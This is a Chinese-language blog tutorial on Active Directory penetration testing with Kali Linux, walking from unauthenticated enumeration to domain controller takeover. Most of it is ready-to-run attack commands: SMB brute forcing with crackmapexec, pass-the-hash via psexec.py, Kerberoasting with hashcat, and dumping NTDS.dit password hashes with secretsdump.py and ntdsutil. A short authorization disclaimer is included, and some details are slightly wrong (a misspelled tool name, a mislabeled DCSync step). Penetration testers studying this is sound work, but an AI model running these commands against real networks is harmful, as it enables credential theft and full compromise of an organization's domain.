---
title: Active Directory 渗透：从枚举到域控接管
slug: kali-活动目录域渗透-o4p5q
date: 2026-09-30
visibility: public
tags: Kali Linux, Active Directory, 域渗透, 内网, DC, 教程
---

# Active Directory 渗透：从枚举到域控接管

> 企业内网 80% 的资产都跑在 **Active Directory（AD）** 之上。拿下域控 ≈ 拿下整个企业。本文系统讲解 AD 渗透的完整链路：从无凭据枚举，到横向移动，最终**域控接管**。

## 一、AD 核心概念速览

| 概念 | 说明 |
|------|------|
| 域（Domain） | 一组受统一策略管理的计算机与账号 |
| 域控（DC） | 域的管理服务器（存密码哈希的数据库） |
| AD 对象 | 用户、计算机、组、GPO |
| 域管组 | Domain Admins 组权限最高 |
| 信任关系 | 域与域之间的信任（可横向跨越） |

### 攻击视角关键点

- 域管账号的密码哈希存在 **NTDS.dit**（域控数据库）
- 一句话目标：拿到域管权限 → DCSync 导出所有哈希

## 二、侦察与枚举：拿内部账号

### 目标机 IP 收集

```bash
# 主机发现
nmap -sn 10.10.10.0/24
nmap -sT -p 445,3389 10.10.10.0/24
```

### 域内枚举（无凭据）

```bash
# 工具集合 Impacket（Kali 内置）
# 枚举共享
smbclient -L //10.10.10.10 -N

# 枚举用户（匿名）
crackmapexec smb 10.10.10.0/24 -u '' -p ''

# Kerbrute 枚举有效用户名（不触发账户锁定）
kerbrute userenum -dc-ip 10.10.10.10 --dc 10.10.10.10 userlist.txt
```

## 三、凭据获取：拿到第一把钥匙

| 方法 | 说明 |
|------|------|
| 弱密码爆破 | 使用 crackmapexec 爆破 SMB |
| 抓取 NTNL 哈希 | 本机 GetNPUsers / kerberoast |
| AS-REP Roasting | 未开启预认证账号直接爆破 |
| 血灵（BloodHound） | 可视化找攻击路径 |

```bash
# 爆破 SMB
crackmapexec smb 10.10.10.0/24 -u users.txt -p passwords.txt

# 提取凭据
secretdump.py domain/username:password@10.10.10.10

# 转储本地哈希
secretsdump.py -ntds ntds.dit -system SYSTEM -history
```

## 四、横向移动：从一台到全部

### 方法一：密码/哈希传递（Pass-the-Hash）

```bash
# 用哈希直接登录（无需明文密码）
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM哈希> domain/Administrator@10.10.10.10
```

### 方法二：令牌伪造 / Impersonation

```
1. 在服务机拿到 SYSTEM 权限
2. 用 Incognito / mimikatz 查看可用令牌
3. impersonate 域管令牌 → 域管权限
```

### 方法三：Kerberoasting（常见提权）

```bash
# 请求服务票并离线破解
GetUserSPNs.py -request domain/user:pass -output hash.txt
hashcat -m 13100 hash.txt wordlist.txt
```

## 五、域控接管：Dump NTDS

拿到域管权限后，转储全部哈希：

```bash
# 方式一：Impacket
secretsdump.py domain/admin:pass@10.10.10.10 -just-dc-ntlm

# 方式二：在线 dcsync（不需要域管登录）
secretsdump.py -just-dc-ntlm domain/admin:pass@10.10.10.10

# 方式三：离线（进入域控后）
ntdsutil "ac i ntds" "activate instance ntds" "ifm"
# 或用 vssadmin 卷影复制 ntds.dit
```

导出后离线爆破：

```bash
hashcat -m 1000 ntds_hash.txt rockyou.txt
```

## 六、常用攻击工具速查（Kali）

| 工具 | 用途 |
|------|------|
| nmap | 资产发现 |
| crackmapexec | 批量验证/爆破 |
| BloodHound + neo4j | 攻击路径可视化 |
| Impacket 全家桶 | 认证/哈希/远程 |
| mimikatz | 内存凭证抓取 |
| kerbrute | 用户枚举 |
| Evil-WinRM | WinRM 远程 shell |

## 安全合规

> AD 渗透测试只能针对**已授权**的企业环境。域控是核心资产，任何操作前必须有书面授权，测试完必须清理痕迹。

## 小结

- 拿到普通用户是起点，目标是域控的 NTDS.dit
- 枚举 → 拿凭据 → 横向 → 域控，四步闭环
- 哈希传递、Kerberoasting、BloodHound 是三大核心技巧
- Impacket 是 Kali 上最强大的 AD 工具族
- 域渗透本质是"权限链"游戏，BloodHound 帮你找最短路径

> 下一篇：云安全渗透测试——Docker 与 Kubernetes 攻防。